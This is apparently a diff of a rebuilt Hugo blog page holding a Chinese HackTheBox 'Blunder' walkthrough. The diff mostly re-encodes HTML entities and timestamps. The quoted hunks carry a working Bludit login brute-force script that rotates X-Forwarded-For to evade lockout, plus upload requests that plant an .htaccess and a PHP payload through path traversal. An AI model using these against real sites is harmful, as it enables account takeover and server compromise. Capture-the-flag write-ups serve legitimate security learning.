@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.110.0"><meta name="theme-color" content="#fff" />
     <meta name="color-scheme" content="light dark">
 
     
@@ -21,7 +21,7 @@
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.d82c753d66fbef2856c2724a5780616edad8aec63de7b22ad9f0da04399cf246.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.1a7822cfcef5444fb929909731e9fd1bdfdbe1d6148f6085416ab3527d76d403.js"></script>
 
     
 
@@ -57,7 +57,7 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2020-07-16T00:00:00+00:00",
-        "dateModified": "2022-10-30T10:47:31+08:00",
+        "dateModified": "2022-10-30T10:47:32+08:00",
         "url": "https://blog.wh1sper.com/posts/hacktheboxblunder/",
         "headline": "HackTheBox::Blunder",
         "description": "玩一手HTB 打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 Bludit cms 在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口……",
@@ -107,7 +107,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180614.png" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2020-07-16T00:00:00&#43;00:00" />
-    <meta property="article:modified_time" content="2022-10-30T10:47:31&#43;08:00" />
+    <meta property="article:modified_time" content="2022-10-30T10:47:32&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -243,7 +243,7 @@
     
     
         
-        <time datetime="2022-10-30T10:47:31&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
+        <time datetime="2022-10-30T10:47:32&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
     
     
     
@@ -308,40 +308,40 @@ import re
 import requests
  
 def open_ressources(file_path):
-    return [item.replace(&quot;\n&quot;, &quot;&quot;) for item in open(file_path).readlines()]
+    return [item.replace(&#34;\n&#34;, &#34;&#34;) for item in open(file_path).readlines()]
  
-host = 'http://10.10.10.191'
-login_url = host + '/admin/login'
-username = 'fergus'
-wordlist = open_ressources('wordlist.txt')
+host = &#39;http://10.10.10.191&#39;
+login_url = host + &#39;/admin/login&#39;
+username = &#39;fergus&#39;
+wordlist = open_ressources(&#39;wordlist.txt&#39;)
  
 for password in wordlist:
     session = requests.Session()
     login_page = session.get(login_url)
-    csrf_token = re.search('input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;', login_page.text).group(1)
+    csrf_token = re.search(&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;, login_page.text).group(1)
  
-    print('[*] Trying: {p}'.format(p = password))
+    print(&#39;[*] Trying: {p}&#39;.format(p = password))
  
     headers = {
-        'X-Forwarded-For': password,
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
-        'Referer': login_url
+        &#39;X-Forwarded-For&#39;: password,
+        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;,
+        &#39;Referer&#39;: login_url
     }
  
     data = {
-        'tokenCSRF': csrf_token,
-        'username': username,
-        'password': password,
-        'save': ''
+        &#39;tokenCSRF&#39;: csrf_token,
+        &#39;username&#39;: username,
+        &#39;password&#39;: password,
+        &#39;save&#39;: &#39;&#39;
     }
  
     login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
  
-    if 'location' in login_result.headers:
-        if '/admin/dashboard' in login_result.headers['location']:
+    if &#39;location&#39; in login_result.headers:
+        if &#39;/admin/dashboard&#39; in login_result.headers[&#39;location&#39;]:
             print()
-            print('SUCCESS: Password found!')
-            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print(&#39;SUCCESS: Password found!&#39;)
+            print(&#39;Use {u}:{p} to login.&#39;.format(u = username, p = password))
             print()
             break
 </code></pre><p><img src="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180633.png" alt="img"></p>
@@ -365,17 +365,17 @@ Connection: close
 Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
  
 -----------------------------1197595220477940257964308486
-Content-Disposition: form-data; name=&quot;images[]&quot;; filename=&quot;.htaccess&quot;
+Content-Disposition: form-data; name=&#34;images[]&#34;; filename=&#34;.htaccess&#34;
 Content-Type: image/jpeg
  
 RewriteEngine off
 AddType application/x-httpd-php jpg
 -----------------------------1197595220477940257964308486
-Content-Disposition: form-data; name=&quot;uuid&quot;
+Content-Disposition: form-data; name=&#34;uuid&#34;
  
 21b8a0e80e433cb7453e7d72382c6bc1
 -----------------------------1197595220477940257964308486
-Content-Disposition: form-data; name=&quot;tokenCSRF&quot;
+Content-Disposition: form-data; name=&#34;tokenCSRF&#34;
  
 c623c868d292dec9b4e11c104f54c9e3dde971ee
 -----------------------------1197595220477940257964308486--
@@ -394,16 +394,16 @@ Connection: close
 Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
  
 -----------------------------1197595220477940257964308486
-Content-Disposition: form-data; name=&quot;images[]&quot;; filename=&quot;wh1sper.jpg&quot;
+Content-Disposition: form-data; name=&#34;images[]&#34;; filename=&#34;wh1sper.jpg&#34;
 Content-Type: image/jpeg
  
-&lt;?php file_put_contetns(&quot;../wh1sper.php&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;);?&gt;
+&lt;?php file_put_contetns(&#34;../wh1sper.php&#34;,&#34;&lt;?php phpinfo();?&gt;&#34;);?&gt;
 -----------------------------1197595220477940257964308486
-Content-Disposition: form-data; name=&quot;uuid&quot;
+Content-Disposition: form-data; name=&#34;uuid&#34;
  
 21b8a0e80e433cb7453e7d72382c6bc1/../../../tmp/temp
 -----------------------------1197595220477940257964308486
-Content-Disposition: form-data; name=&quot;tokenCSRF&quot;
+Content-Disposition: form-data; name=&#34;tokenCSRF&#34;
  
 c623c868d292dec9b4e11c104f54c9e3dde971ee
 -----------------------------1197595220477940257964308486--
@@ -419,7 +419,7 @@ c623c868d292dec9b4e11c104f54c9e3dde971ee
    #     __  __                     __           ______    _____           #
    #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
    #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
-   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
    #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
    #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
    #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
@@ -485,7 +485,7 @@ root@blunder:/var/www/bludit-3.9.2#
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-10-30 10:47:31 CST" style="cursor:help">
+        <span title="Updated @ 2022-10-30 10:47:32 CST" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-10-30</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-10-30</text></g></svg>
         </span></div>
